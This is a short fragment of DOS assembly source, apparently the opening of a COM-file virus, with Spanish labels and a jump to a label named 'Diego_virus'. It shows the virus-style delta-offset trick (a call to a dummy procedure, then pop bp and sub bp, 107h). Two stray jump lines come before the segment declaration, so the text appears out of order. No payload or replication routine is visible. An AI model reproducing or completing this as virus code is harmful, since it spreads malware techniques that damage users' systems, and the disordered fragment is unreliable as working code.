	JE READ
	JNE Diego_virus

codigo segment 'code'

	org 100h 

	assume cs:codigo,ds:codigo,es:codigo
	
start proc far
START:
	push cs
	push cs
	
	pop ds	
	pop es
	
	call falso_proc

falso_proc 	proc near
falso_proc  endp

	pop bp
	sub bp, 107h
